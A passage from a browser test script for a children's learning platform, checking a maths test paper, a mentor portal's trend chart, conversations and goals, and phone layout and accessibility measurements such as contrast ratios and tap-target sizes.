       with no warning reads to a child as their own falling apart. The stub
       paper is two foundation questions then one stretch, so there is exactly
       one marker, it sits before question 3, and it names the tier. */
    ok('the paper says which paper it is',
       /Foundation paper/.test(await ml.evaluate(() =>
         document.querySelector('.ml-paper-stage').textContent)));
    ok('…and marks the point where the questions step up',
       await ml.evaluate(() => {
         const steps = Array.from(document.querySelectorAll('.ml-q-step'));
         if (steps.length !== 1 || !/Stretch from here/.test(steps[0].textContent)) return false;
         // Before the third question, and after the second.
         const items = Array.from(document.querySelectorAll('.ml-qs > li'));
         return items.indexOf(steps[0]) === 2;
       }));
    /* The marker is decoration around questions that are numbered anyway, so
       it must not be announced as a list item a screen-reader user has to
       step through. */
    ok('…without putting a phantom question into the list for a screen reader',
       await ml.evaluate(() =>
         document.querySelector('.ml-q-step').getAttribute('aria-hidden') === 'true'
         && document.querySelectorAll('.ml-q').length === 3));

    ok('the paper shows every question at once, the way a paper does',
       await ml.evaluate(() => document.querySelectorAll('.ml-q').length) === 3
       && await ml.evaluate(() => document.querySelectorAll('.ml-q .ml-q-in').length) === 3);
    /* The answers to this paper are 128, 4 and 7 in the stub. None may appear
       anywhere on the page while it is still being written. */
    ok('…and carries no answer anywhere in it, in the markup or out of it',
       await ml.evaluate(() => !/\b128\b/.test(document.getElementById('root').innerHTML)));

    /* Filled in BACKWARDS. Answers keyed off focus order or off render order
       rather than off the question's own index look identical on screen and
       arrive scrambled; going last-to-first is what separates them. */
    await ml.evaluate(async () => {
      const set = (el, v) => {
        const proto = Object.getPrototypeOf(el);
        Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, v);
        el.dispatchEvent(new Event('input', { bubbles: true }));
      };
      const ins = Array.from(document.querySelectorAll('.ml-q-in'));
      set(ins[2], 'third'); set(ins[0], 'first'); set(ins[1], 'second');
    });
    await ml.evaluate(() => document.querySelector('.ml-paper-ft .arc-next').click());
    await ml.waitForSelector('.ml-score', { timeout: 10000 });
    const mlSent = await ml.evaluate(() => window.__mathSubmits);
    ok('answers go up indexed against the question they were typed against',
       mlSent.length === 1 && mlSent[0].answers.join('|') === 'first|second|third');
    ok('…on the round the server minted', mlSent[0].roundId === 'ML-TESTPAPER');

    const mlMarked = await ml.evaluate(() => document.querySelector('.ml-marked').innerText);
    ok('the marked paper shows the score against the pass mark', /67/.test(mlMarked) && /70%/.test(mlMarked));
    ok('…and the right answer beside the one that was wrong, and only that one',
       await ml.evaluate(() => {
         const rights = document.querySelectorAll('.ml-mark-right');
         return rights.length === 1
             && /4/.test(rights[0].innerText)
             && rights[0].closest('.ml-mark').classList.contains('is-no');
       }));
    ok('…marking each answer with a symbol as well as a colour',
       await ml.evaluate(() => {
         const rows = Array.from(document.querySelectorAll('.ml-mark'));
         return rows.length === 3
             && rows.filter(r => /✓/.test(r.innerText)).length === 2
             && rows.filter(r => /✗/.test(r.innerText)).length === 1;
       }));

    /* The breakdown by difficulty. A single percentage tells a student
       nothing they can act on; this is the part that says WHERE the marks
       went, and it is computed by zipping the marks against the tiers that
       came down with the paper — so it must survive the paper actually
       spanning more than one tier, and must never claim a tier the paper did
       not carry. The stub paper is two foundation questions (one right, one
       wrong) and one stretch (right). */
    ok('the marking breaks the score down by difficulty, not just a percentage',
       await ml.evaluate(() => {
         const bars = Array.from(document.querySelectorAll('.ml-tier'));
         const read = b => ({
           name: b.querySelector('.ml-tier-n').textContent.trim(),
           val: b.querySelector('.ml-tier-v').textContent.trim(),
         });
         const got = bars.map(read);
         return got.length === 2                     // only the tiers the paper carried
             && got[0].name === 'Foundation' && got[0].val === '1/2'
             && got[1].name === 'Stretch'    && got[1].val === '1/1';
       }));
    ok('…and names the tier the marks actually went on',
       /foundation questions are where the marks went: 1 of 2 right/i.test(
         await ml.evaluate(() => document.querySelector('.ml-tier-say').textContent)));
    /* Every bar carries its own count in text. A bar alone is unreadable to a
       screen reader and unreadable at a glance, and three coloured bars with
       no numbers is exactly the chart that says nothing. */
    ok('…with every bar carrying its number, never colour alone',
       await ml.evaluate(() => Array.from(document.querySelectorAll('.ml-tier'))
         .every(b => /^\d+\/\d+$/.test(b.querySelector('.ml-tier-v').textContent.trim()))));
    await ml.close();

    /* The clock running out hands the paper in — once. */
    const mlT = await browser.newPage();
    const mlTErrs = [];
    mlT.on('pageerror', e => mlTErrs.push(String(e.message)));
    await mlT.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok&fast=1', { waitUntil: 'networkidle' });
    await mlT.waitForSelector('.ml-teaser', { timeout: 15000 });
    await mlT.evaluate(() => document.querySelector('.ml-teaser .arc-cta').click());
    await mlT.waitForSelector('.ml-ladder', { timeout: 10000 });
    await mlT.evaluate(() => document.querySelectorAll('.ml-lv')[2].querySelector('.ml-go').click());
    let mlGraded = true;
    try { await mlT.waitForSelector('.ml-score', { timeout: 12000 }); }
    catch (_) { mlGraded = false; }
    await mlT.waitForTimeout(900);     // past the held grade, to catch a stray second send
    const mlTimed = await mlT.evaluate(() => window.__mathSubmits);
    await mlT.close();
    ok('a paper whose clock runs out hands itself in without being told',
       mlTErrs.length === 0 && mlGraded && mlTimed.length >= 1);
    ok('…exactly once, however the ticking clock and a slow marking overlap (' + mlTimed.length + ')',
       mlTimed.length === 1);

    /* Legible on the surface it actually renders into — the same white-on-white
       trap the Arcade stylesheet fell into, on a screen whose whole job is
       telling a child which answers were wrong. */
    const mlC = await browser.newPage();
    await mlC.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok&css=1', { waitUntil: 'networkidle' });
    await mlC.waitForSelector('.ml-teaser', { timeout: 15000 });
    await mlC.waitForFunction(() => getComputedStyle(document.querySelector('.ml-teaser')).borderRadius !== '0px',
                              null, { timeout: 10000 });
    await mlC.evaluate(() => document.querySelector('.ml-teaser .arc-cta').click());
    await mlC.waitForSelector('.ml-ladder', { timeout: 10000 });
    await mlC.evaluate(() => {
      const root = document.getElementById('root');
      const wrap = document.createElement('div');
      wrap.className = 'cm-slack-page';
      wrap.innerHTML = '<div class="cm-slack"><main class="cm-col"><div class="cm-stream is-feed" id="mlslot"></div></main></div>';
      root.parentNode.insertBefore(wrap, root);
      document.getElementById('mlslot').appendChild(root);
    });
    const mlContrast = await mlC.evaluate(() => {
      const lum = (r, g, b) => { const f = (c) => { c /= 255; return c <= 0.03928 ? c / 12.92 : Math.pow((c + 0.055) / 1.055, 2.4); };
        return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b); };
      const num = (s) => (String(s).match(/[\d.]+/g) || [0, 0, 0]).map(Number);
      const backdrop = (el) => {
        let n = el;
        while (n) {
          const c = getComputedStyle(n).backgroundColor, m = num(c);
          if (c !== 'rgba(0, 0, 0, 0)' && c !== 'transparent' && (m.length < 4 || m[3] === 1)) return m;
          n = n.parentElement;
        }
        return [255, 255, 255];
      };
      const out = [];
      document.querySelectorAll('.ml *').forEach((el) => {
        const t = (el.textContent || '').trim();
        if (!t || el.children.length > 0) return;
        const f = num(getComputedStyle(el).color), g = backdrop(el);
        const a = f[3] === undefined ? 1 : f[3];
        const c = [0, 1, 2].map(i => f[i] * a + g[i] * (1 - a));
        const L1 = lum(c[0], c[1], c[2]), L2 = lum(g[0], g[1], g[2]);
        out.push({ cls: String(el.className || el.tagName), ratio: (Math.max(L1, L2) + 0.05) / (Math.min(L1, L2) + 0.05) });
      });
      return out;
    });
    await mlC.close();
    const mlWorst = mlContrast.slice().sort((a, b) => a.ratio - b.ratio)[0];
    ok('the Math Lab has text to measure on the community surface (' + mlContrast.length + ' nodes)',
       mlContrast.length >= 15);
    ok('…and every piece of it clears 4.5:1 there (worst: '
       + (mlWorst ? mlWorst.ratio.toFixed(2) + ' on .' + String(mlWorst.cls).split(' ')[0] : 'n/a') + ')',
       mlContrast.every(c => c.ratio >= 4.5));


    /* ── The Mentor Portal ─────────────────────────────────────────────────
     * Two things here can look right on screen and be wrong underneath. The
     * mentee SCOPE is the link between an admin's pairing and what a mentor
     * actually sees — it was missing entirely, and a switch that renders but
     * asks the server for the wrong thing looks identical. And the V3 trend's
     * bar heights ARE the data: a bar drawn against the wrong denominator, or
     * spilling out of its track, is a chart that lies quietly. Both measured. */
    const mt = await browser.newPage();
    const mtErrs = [];
    mt.on('pageerror', e => mtErrs.push(String(e.message)));
    await mt.goto(BASE + '/tests/_boards_fixture.html?board=mentor&mode=ok&css=1', { waitUntil: 'networkidle' });
    await mt.waitForSelector('[aria-label="Which children to show"]', { timeout: 15000 });
    ok('the mentor portal mounts with no script error', mtErrs.length === 0);
    if (mtErrs.length) console.error('       ', mtErrs.slice(0, 3).join(' | '));

    /* The scope switch only exists for someone who HAS mentees — a mentor with
       none must never be shown a control with one empty side. */
    ok('a mentor with mentees gets the my-mentees switch, showing how many',
       /My mentees \(2\)/.test(await mt.evaluate(() => document.querySelector('[aria-label="Which children to show"]').innerText)));
    ok('…and it opens on their mentees, not on the whole centre',
       await mt.evaluate(() => document.querySelectorAll('button[aria-label^="Open the record for"]').length) === 2);
    ok('…with the pressed state on the side actually being shown',
       await mt.evaluate(() => {
         const b = Array.from(document.querySelectorAll('[aria-label="Which children to show"] button'));
         return b[0].getAttribute('aria-pressed') === 'true' && b[1].getAttribute('aria-pressed') === 'false';
       }));

    await mt.evaluate(() => document.querySelectorAll('[aria-label="Which children to show"] button')[1].click());
    await mt.waitForFunction(() => document.querySelectorAll('button[aria-label^="Open the record for"]').length === 4,
                             null, { timeout: 8000 }).catch(() => {});
    ok('switching to the whole centre asks the SERVER for the centre, not just a filter',
       await mt.evaluate(() => window.__mtrScope) === 'centre'
       && await mt.evaluate(() => document.querySelectorAll('button[aria-label^="Open the record for"]').length) === 4);
    await mt.evaluate(() => document.querySelectorAll('[aria-label="Which children to show"] button')[0].click());
    await mt.waitForFunction(() => document.querySelectorAll('button[aria-label^="Open the record for"]').length === 2,
                             null, { timeout: 8000 }).catch(() => {});

    /* Open one child's record. */
    await mt.evaluate(() => document.querySelector('button[aria-label^="Open the record for"]').click());
    await mt.waitForSelector('[role="dialog"]', { timeout: 8000 });
    await mt.waitForTimeout(300);
    ok('a name opens that child\'s record, asked for by id',
       await mt.evaluate(() => window.__mtrChild) === 'K1');

    /* ── The V3 trend ───────────────────────────────────────────────────── */

    const strip = await mt.evaluate(() => {
      const cells = Array.from(document.querySelectorAll('[aria-label*=", week "]'));
      return cells.map(c => {
        const bar = c.firstElementChild;
        const cb = c.getBoundingClientRect(), bb = bar ? bar.getBoundingClientRect() : null;
        return {
          label: c.getAttribute('aria-label'),
          cellH: Math.round(cb.height), cellBottom: Math.round(cb.bottom),
          barH: bb ? Math.round(bb.height) : 0, barBottom: bb ? Math.round(bb.bottom) : 0,
          hasBar: !!bar,
        };
      });
    });
    ok('the trend draws three rows of eight weeks (' + strip.length + ' cells)', strip.length === 24);
    /* An unrated week must carry NO bar. A zero-height bar and an empty track
       look the same at a glance but mean opposite things — "rated 0" is not a
       score that exists, and the gaps are the finding. */
    const unrated = strip.filter(c => /not rated/.test(c.label));
    ok('an unrated week has no bar at all, so a gap can never read as a zero (' + unrated.length + ' gaps)',
       unrated.length === 15 && unrated.every(c => !c.hasBar));
    /* Every cell the same height — the unrated cell carries a dashed border and
       the rated one does not, which silently made them different sizes. */
    ok('every week cell is the same height, dashed or not',
       new Set(strip.map(c => c.cellH)).size === 1);
    /* The bars ARE the data: 1, 3 and 5 out of 5 must be 20%, 60% and 100% of
       the track, within a pixel of rounding. */
    const rated = strip.filter(c => /out of 5/.test(c.label));
    const wrong = rated.filter(c => {
      const v = Number((c.label.match(/(\d) out of 5/) || [])[1]);
      const want = (v / 5) * (c.cellH - 2);      // less the 1px border top and bottom
      return Math.abs(c.barH - want) > 1.5;
    });
    ok('each bar is its value out of five, not out of something else ('
       + rated.length + ' bars, ' + wrong.length + ' wrong)', rated.length === 9 && wrong.length === 0);
    /* Bars grow from one baseline and stay inside the track. This is the bug
       box-sizing caused: the bar hung out of the bottom of its own cell. */
    ok('no bar spills out of its track',
       rated.every(c => c.barBottom <= c.cellBottom + 1 && c.barH <= c.cellH));

    /* Identity comes from the row label, never from colour alone — which is why
       there is one colour here and the height does the work. */
    ok('each row of the trend is named, so identity never rests on colour',
       await mt.evaluate(() => {
         const t = document.querySelector('[role="dialog"]').innerText;
         return /Verbal/.test(t) && /Vocal/.test(t) && /Visual/.test(t);
       }));
    ok('…and the strip has a table equivalent for anyone who cannot read it',
       await mt.evaluate(() => {
         const tb = document.querySelector('[role="dialog"] table.sr-only');
         return !!tb && tb.querySelectorAll('tbody tr').length === 8;
       }));
    ok('the trend says how many weeks were actually rated, not just how many are drawn',
       /3 of 8 weeks rated/.test(await mt.evaluate(() => document.querySelector('[role="dialog"]').innerText)));

    /* ── Conversations ──────────────────────────────────────────────────── */

    ok('a conversation shows what was discussed and what was agreed',
       await mt.evaluate(() => {
         const t = document.querySelector('[role="dialog"]').innerText;
         return /has not been sleeping/.test(t) && /Check in every Monday/.test(t);
       }));
    /* A raised concern says so in WORDS. An orange border alone is invisible to
       a good many readers, on the one screen where that matters most. */
    ok('a raised concern is stated in words, not only in a colour',
       /CONCERN RAISED/.test(await mt.evaluate(() => document.querySelector('[role="dialog"]').innerText)));
    /* Only the author gets Edit and Delete. The fixture has one entry by this
       mentor and one by another; exactly one pair of controls may exist. */
    ok('only the author of an entry can edit or delete it',
       await mt.evaluate(() => {
         const btns = Array.from(document.querySelectorAll('[role="dialog"] button'));
         return btns.filter(b => b.textContent.trim() === 'Edit').length === 1
             && btns.filter(b => b.textContent.trim() === 'Delete').length === 1;
       }));

    await mt.evaluate(() => {
      const b = Array.from(document.querySelectorAll('[role="dialog"] button'))
        .find(x => /Write up a conversation/.test(x.textContent || ''));
      if (b) b.click();
    });
    await mt.waitForSelector('[role="dialog"] textarea', { timeout: 8000 });
    /* Backdating is the point: a write-up happens after the conversation. But
       the date control must not offer a day that has not happened. */
    ok('the date can be backdated but not set into the future',
       await mt.evaluate(() => {
         const d = document.querySelector('[role="dialog"] input[type="date"]');
         return !!d.max && d.max === new Date().toISOString().slice(0, 10);
       }));
    await mt.evaluate(() => {
      const set = (el, v) => {
        const proto = Object.getPrototypeOf(el);
        Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, v);
        el.dispatchEvent(new Event('input', { bubbles: true }));
      };
      const tas = document.querySelectorAll('[role="dialog"] textarea');
      set(tas[0], 'She spoke up in the group today.');
      set(tas[1], 'Ask her to open the next session.');
      document.querySelector('[role="dialog"] input[type="checkbox"]').click();
      Array.from(document.querySelectorAll('[role="dialog"] button'))
        .find(x => /^Save$/.test(x.textContent.trim())).click();
    });
    await mt.waitForTimeout(400);
    const mtSaved = await mt.evaluate(() => window.__mtrSaves);
    ok('a written-up conversation goes up against the right child, whole',
       mtSaved.length >= 1 && mtSaved[0].subjectId === 'K1'
       && mtSaved[0].m.discussed === 'She spoke up in the group today.'
       && mtSaved[0].m.agreed === 'Ask her to open the next session.');
    ok('…and the concern flag goes with it', mtSaved[0].m.concern === true);

    /* ── Goals ──────────────────────────────────────────────────────────── */

    await mt.evaluate(() => {
      const b = Array.from(document.querySelectorAll('[role="dialog"] [role="tab"]')).find(x => /Goals/.test(x.textContent || ''));
      if (b) b.click();
    });
    await mt.waitForTimeout(300);
    const goalsTxt = await mt.evaluate(() => document.querySelector('[role="dialog"]').innerText);
    ok('the goals tab counts the OPEN ones, not every goal ever set', /Goals \(2\)/.test(goalsTxt));
    /* Overdue in words as well as in colour, for the same reason as the
       concern flag. */
    ok('a goal past its date says OVERDUE, not just turns orange', /OVERDUE/.test(goalsTxt));
    ok('a goal that was dropped or done can be reopened rather than retyped',
       await mt.evaluate(() => Array.from(document.querySelectorAll('[role="dialog"] button'))
         .some(b => /Reopen/.test(b.textContent || ''))));
    /* 'Drop' exists so a goal that stopped being the right goal is not cleared
       by pretending it was achieved. */
    ok('an open goal can be dropped as well as marked done',
       await mt.evaluate(() => {
         const b = Array.from(document.querySelectorAll('[role="dialog"] button'));
         return b.filter(x => /Done/.test(x.textContent || '')).length === 2
             && b.filter(x => /Drop/.test(x.textContent || '')).length === 2;
       }));

    /* A plain mentor has no centre-wide queue — their own concerns are on the
       records they wrote them on. */
    ok('a plain mentor is not given the centre-wide queue',
       await mt.evaluate(() => !Array.from(document.querySelectorAll('[role="tab"]'))
         .some(t => /Needs attention/.test(t.textContent || ''))));
    await mt.close();

    /* ── The lead's queue ───────────────────────────────────────────────────
     * The reason the concern flag exists. A notification is read once and gone;
     * the standing list of what is outstanding has to live somewhere. It was
     * unreachable — the tab row rendered only for people who TEACH, so a lead
     * mentor had no way to reach anything but the roster. */
    const mtL = await browser.newPage();
    const mtLErrs = [];
    mtL.on('pageerror', e => mtLErrs.push(String(e.message)));
    await mtL.goto(BASE + '/tests/_boards_fixture.html?board=mentor&mode=ok&css=1&lead=1', { waitUntil: 'networkidle' });
    await mtL.waitForSelector('[role="tab"]', { timeout: 15000 });
    ok('a lead gets a Needs attention tab, and no script error getting it',
       mtLErrs.length === 0 && await mtL.evaluate(() => Array.from(document.querySelectorAll('[role="tab"]'))
         .some(t => /Needs attention/.test(t.textContent || ''))));
    await mtL.evaluate(() => {
      const t = Array.from(document.querySelectorAll('[role="tab"]')).find(x => /Needs attention/.test(x.textContent || ''));
      if (t) t.click();
    });
    await mtL.waitForTimeout(500);
    const queue = await mtL.evaluate(() => document.body.innerText);
    ok('…listing the concerns raised, with the child named',
       /concerns raised \(1\)/i.test(queue) && /Adaeze Okonkwo/.test(queue));
    ok('…and the goals that have gone past their date',
       /goals past their date \(1\)/i.test(queue) && /OVERDUE/.test(queue));
    /* Straight from the queue into the record — the point of a queue is that
       you can act on it, not that you can read it. */
    await mtL.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /Adaeze Okonkwo/.test(x.textContent || ''));
      if (b) b.click();
    });
    await mtL.waitForSelector('[role="dialog"]', { timeout: 8000 }).catch(() => {});
    ok('…and a name in the queue opens that child\'s record',
       await mtL.evaluate(() => window.__mtrChild) === 'K1');
    await mtL.close();

    /* ── The portal on a phone ──────────────────────────────────────────── */

    const mtT = await browser.newContext({ viewport: { width: 360, height: 780 }, hasTouch: true });
    const mtP = await mtT.newPage();
    await mtP.goto(BASE + '/tests/_boards_fixture.html?board=mentor&mode=ok&css=1', { waitUntil: 'networkidle' });
    await mtP.waitForSelector('[aria-label="Which children to show"]', { timeout: 15000 });
    await mtP.evaluate(() => document.querySelector('button[aria-label^="Open the record for"]').click());
    await mtP.waitForSelector('[role="dialog"]', { timeout: 8000 });
    await mtP.waitForTimeout(300);
    const phone = await mtP.evaluate(() => {
      const doc = document.documentElement;
      const cells = Array.from(document.querySelectorAll('[aria-label*=", week "]'));
      const btns = Array.from(document.querySelectorAll('[role="dialog"] button'))
        .filter(b => b.getBoundingClientRect().width > 1);
      return {
        overflow: doc.scrollWidth - doc.clientWidth,
        narrowestCell: Math.min(...cells.map(c => c.getBoundingClientRect().width)),
        smallestBtn: Math.min(...btns.map(b => {
          const r = b.getBoundingClientRect(); return Math.round(Math.min(r.width, r.height));
        })),
      };
    });
    ok('the record does not push the page sideways on a 360px phone (' + phone.overflow + 'px over)',
       phone.overflow <= 0);
    /* Eight weeks in a 360px column is the tightest this gets. Below about 12px
       a column stops reading as a bar and starts reading as a tick. */
    ok('…and a week is still wide enough to read as a bar ('
       + phone.narrowestCell.toFixed(1) + 'px)', phone.narrowestCell >= 12);
    ok('…with every control in the record a thumb-sized target (' + phone.smallestBtn + 'px)',
       phone.smallestBtn >= 40);
    await mtP.close();
    await mtT.close();

    /* ── The Math Lab on a phone ───────────────────────────────────────────
     * The community composer shipped 24.6px wide on a phone because a flex row
     * would not wrap, and nothing measured it. The Lab has two rows with the
     * same shape — the level card (icon, blurb, action) and the paper footer —
     * so they are measured on a real 360px viewport rather than read off the
     * stylesheet. 360 and not 390: it is the narrowest Android in common use,
     * and what fits there fits everywhere. */
    const mlT2 = await browser.newContext({ viewport: { width: 360, height: 780 }, hasTouch: true });
    const mlPh = await mlT2.newPage();
    await mlPh.goto(BASE + '/tests/_boards_fixture.html?board=arcade&mode=ok&css=1', { waitUntil: 'networkidle' });
    await mlPh.waitForSelector('.ml-teaser', { timeout: 15000 });
    await mlPh.waitForFunction(() => getComputedStyle(document.querySelector('.ml-teaser')).borderRadius !== '0px',
                               null, { timeout: 10000 });
    await mlPh.evaluate(() => document.querySelector('.ml-teaser .arc-cta').click());
    await mlPh.waitForSelector('.ml-ladder', { timeout: 10000 });
    await mlPh.waitForTimeout(150);

    const ladderPhone = await mlPh.evaluate(() => {
      const doc = document.documentElement;
      const cards = Array.from(document.querySelectorAll('.ml-lv'));
      const btns = Array.from(document.querySelectorAll('.ml-lv .ml-go'));
      return {
        overflow: doc.scrollWidth - doc.clientWidth,
        narrowest: Math.min(...cards.map(c => Math.round(c.getBoundingClientRect().width))),
        smallestBtn: btns.length ? Math.min(...btns.map(b => {
          const r = b.getBoundingClientRect(); return Math.round(Math.min(r.width, r.height));
        })) : 0,
        blurbWidth: Math.min(...cards.map(c => Math.round(c.querySelector('.ml-lv-p').getBoundingClientRect().width))),
        smallestChip: (() => {
          const cs = Array.from(document.querySelectorAll('.ml-strand'));
          return cs.length ? Math.min(...cs.map(c => {
            const r = c.getBoundingClientRect(); return Math.round(Math.min(r.width, r.height));
          })) : 0;
        })(),
      };
    });
    ok('the ladder does not push the page sideways on a 360px phone ('
       + ladderPhone.overflow + 'px over)', ladderPhone.overflow <= 0);
    ok('…every level card still uses the width it has (' + ladderPhone.narrowest + 'px)',
       ladderPhone.narrowest >= 320);
    /* The composer bug was exactly this: a row that would not wrap squeezed the
       text to 24.6px while everything still LOOKED laid out. */
    ok('…and the blurb is not squeezed to a column (' + ladderPhone.blurbWidth + 'px)',
       ladderPhone.blurbWidth >= 150);
    ok('…with every Start button a thumb-sized target (' + ladderPhone.smallestBtn + 'px)',
       ladderPhone.smallestBtn >= 44);
    /* WCAG 2.2 2.5.8 is 24×24; these sit in a wrapping row where the spacing
       exception is easy to lose, so they are built to the 44px touch size and
       measured at it. */
    ok('…and every strand chip too (' + ladderPhone.smallestChip + 'px)',
       ladderPhone.smallestChip >= 44);

    await mlPh.evaluate(() => document.querySelectorAll('.ml-lv')[2].querySelector('.ml-go').click());
    await mlPh.waitForSelector('.ml-qs', { timeout: 10000 });
    await mlPh.waitForTimeout(150);
    const paperPhone = await mlPh.evaluate(() => {
      const doc = document.documentElement;
      const ins = Array.from(document.querySelectorAll('.ml-q-in'));
      const ft = document.querySelector('.ml-paper-ft .arc-next').getBoundingClientRect();
      return {
        overflow: doc.scrollWidth - doc.clientWidth,
        narrowestIn: Math.min(...ins.map(i => Math.round(i.getBoundingClientRect().width))),
        inHeight: Math.min(...ins.map(i => Math.round(i.getBoundingClientRect().height))),
        // Below 16px, iOS Safari zooms the page on focus and the paper jumps
        // every time a child taps an answer box.
        fontPx: Math.min(...ins.map(i => parseFloat(getComputedStyle(i).fontSize))),
        handIn: Math.round(Math.min(ft.width, ft.height)),
      };
    });
    ok('the paper does not push the page sideways on a phone (' + paperPhone.overflow + 'px over)',
       paperPhone.overflow <= 0);
    ok('…every answer box is wide enough to type in (' + paperPhone.narrowestIn + 'px)',
       paperPhone.narrowestIn >= 200);
    ok('…and tall enough to tap (' + paperPhone.inHeight + 'px)', paperPhone.inHeight >= 44);
    ok('…at a size iOS will not zoom the page for (' + paperPhone.fontPx + 'px)', paperPhone.fontPx >= 16);
    ok('…and Hand it in is reachable without hunting (' + paperPhone.handIn + 'px)', paperPhone.handIn >= 40);
    await mlPh.close();
    await mlT2.close();

    /* ── The community on a phone ──────────────────────────────────────────
     * Measured against the real class names on a touch viewport. Two things
     * this caught that reading the stylesheet did not: nine controls under
     * 40px — the post menu at 34x22, reaction chips at 49x28 — in a space used
     * by children on phones; and channel Details with no way to open it at all
     * on mobile, because the header hid its button while the stylesheet went
     * on laying out the full-screen pane nobody could reach. */
    const cmT = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true });
    const cmP = await cmT.newPage();
    await cmP.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok&css=1', { waitUntil: 'networkidle' });
    await cmP.waitForFunction(() => Array.from(document.styleSheets).some(ss => {
      try { return (ss.href || '').indexOf('styles.css') !== -1 && ss.cssRules.length > 0; } catch (_) { return false; }
    }), null, { timeout: 10000 });
    /* Stand the community's own markup up; the classes are what carry the CSS.
       This is the REDESIGNED markup — the tab bar, the message actions, the
       filter chips — because the design it used to assert on (a sidebar, a
       header with a burger and two icon buttons) no longer exists. A test that
       keeps measuring deleted chrome passes forever and protects nothing. */
    await cmP.evaluate(() => {
      document.body.className = 'cm-app';
      document.body.innerHTML = '<div class="page cm-page"><div class="cmm">'
        + '<div class="cmm-body">'
        + '<header class="cmm-head"><button class="cmm-av-btn"><span class="cm-avatar cmm-av">A</span></button>'
        + '<div class="cmm-head-txt"><h1 class="cmm-greet">Good morning, Ada</h1>'
        + '<p class="cmm-sub">Egbeda · Coding</p></div>'
        + '<button class="cmm-icon-btn">B</button></header>'
        + '<button class="cmm-search"><span>Search messages</span></button>'
        + '<div class="cmm-chips"><button class="cmm-chip is-on">All</button>'
        + '<button class="cmm-chip">Unread<span class="cmm-chip-n">4</span></button></div>'
        + '<div class="cmm-list"><button class="cmm-ch-row"><span class="cmm-ch-av">#</span>'
        + '<span class="cmm-ch-body"><span class="cmm-ch-name">Commons</span>'
        + '<span class="cmm-ch-prev">Hello</span></span></button></div>'
        + '<div class="cmm-stream"><article class="cmm-msg">'
        + '<div class="cmm-msg-body">Hello</div>'
        + '<div class="cm-chips"><button class="cm-chip-react">👏 <b>3</b></button>'
        + '<button class="cm-react-add">+</button></div>'
        + '<div class="cmm-msg-acts"><button class="cmm-msg-act">React</button>'
        + '<button class="cmm-msg-act">2 replies</button></div></article></div></div>'
        + '<button class="cmm-fab">+</button>'
        + '<nav class="cmm-tabs">'
        + '<button class="cmm-tab is-on"><span class="cmm-tab-l">Today</span></button>'
        + '<button class="cmm-tab"><span class="cmm-tab-l">Channels</span></button>'
        + '<button class="cmm-tab"><span class="cmm-tab-l">Arcade</span></button>'
        + '<button class="cmm-tab"><span class="cmm-tab-l">Journal</span></button>'
        + '</nav></div></div>';
    });
    await cmP.waitForTimeout(250);

    /* Hittable area, not painted box: a chip 28px tall whose ::after reaches 44
       IS a 44px target, and measuring the box would report a problem that is
       not there while missing one that is. */
    const tiny = await cmP.evaluate(() => {
      const out = [];
      document.querySelectorAll('.cmm button').forEach(el => {
        const r = el.getBoundingClientRect();
        if (r.width < 1 || r.height < 1) return;
        if (r.right <= 0 || r.left >= window.innerWidth) return;
        const cx = Math.round(r.left + r.width / 2), cy = Math.round(r.top + r.height / 2);
        /* An ancestor at the probe point is the ancestor being hit, not the
           control — crediting it reports a 38px button as 49px because the row
           around it is tall. A ::after that widens the hit area still returns
           the element itself, so real extensions are still credited. */
        const owns = (x, y) => { const h = document.elementFromPoint(x, y); return !!h && (h === el || el.contains(h)); };
        /* Probe BOTH axes the same way. This measured height by reach and width
           by painted box, which reported a control with a 44px pseudo-element
           hit area as 30px wide — the exact case the "hittable area, not
           painted box" note above exists to handle. */
        let up = 0, down = 0, left = 0, right = 0;
        for (let d = 1; d <= 30; d++) { if (owns(cx, cy - d)) up = d; else break; }
        for (let d = 1; d <= 30; d++) { if (owns(cx, cy + d)) down = d; else break; }
        for (let d = 1; d <= 30; d++) { if (owns(cx - d, cy)) left = d; else break; }
        for (let d = 1; d <= 30; d++) { if (owns(cx + d, cy)) right = d; else break; }
        const h = up + down + 1, w = left + right + 1;
        if (h < 40 || w < 40) out.push(String(el.className).split(' ')[0] + ' ' + w + 'x' + h);
      });
      return out;
    });
    ok('the community has controls to measure on a phone (control)',
       await cmP.evaluate(() => document.querySelectorAll('.cmm button').length) >= 10);
    ok('…and every one of them is a 40px+ target (' + (tiny.length ? tiny.join(', ') : 'all pass') + ')',
       tiny.length === 0);

    /* The four destinations are all reachable, all the time. The redesign put
       them in a tab bar precisely so none of them can be hidden behind a
       burger the way the channel list used to be. */
    ok('all four destinations are on screen, none behind a menu',
       await cmP.evaluate(() => {
         const tabs = [...document.querySelectorAll('.cmm-tab')];
         return tabs.length === 4 && tabs.every(t => {
           const r = t.getBoundingClientRect();
           return getComputedStyle(t).display !== 'none' && r.width > 40 && r.top < window.innerHeight;
         });
       }));
    /* The tab bar must sit ON the viewport bottom and the FAB above it — the
       one place a phone layout most often gets wrong, because the two are
       positioned independently and only collide on a real screen. */
    ok('the tab bar is docked at the bottom and the FAB clears it',
       await cmP.evaluate(() => {
         const bar = document.querySelector('.cmm-tabs').getBoundingClientRect();
         const fab = document.querySelector('.cmm-fab').getBoundingClientRect();
         return Math.abs(bar.bottom - window.innerHeight) < 2 && fab.bottom <= bar.top + 1;
       }));
    await cmP.close(); await cmT.close();

    /* ── The Control Room on a phone ───────────────────────────────────────
     * The console was built at a desk and the mobile rule only ever set
     * `display: flex` on the sidebar — but `.admin-nav` is
     * `flex-direction: column`, which nothing reset, so all thirty sections
     * stacked and the page began a screen and a half down. Alongside it: 10px
     * mono labels, 36px nav rows, and a table you scrolled out into blind
     * because the name column scrolled away with everything else. */
    const amT = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true });
    const amP = await amT.newPage();
    await amP.goto(BASE + '/tests/_boards_fixture.html?board=status&mode=ok&css=1', { waitUntil: 'networkidle' });
    await amP.waitForFunction(() => Array.from(document.styleSheets).some(ss => {
      try { return (ss.href || '').indexOf('styles-app.css') !== -1 && ss.cssRules.length > 0; } catch (_) { return false; }
    }), null, { timeout: 10000 });
    /* The admin's own class names, and a nav as long as the real one — a
       sidebar that stacks only shows up as a problem once it has thirty rows
       in it. */
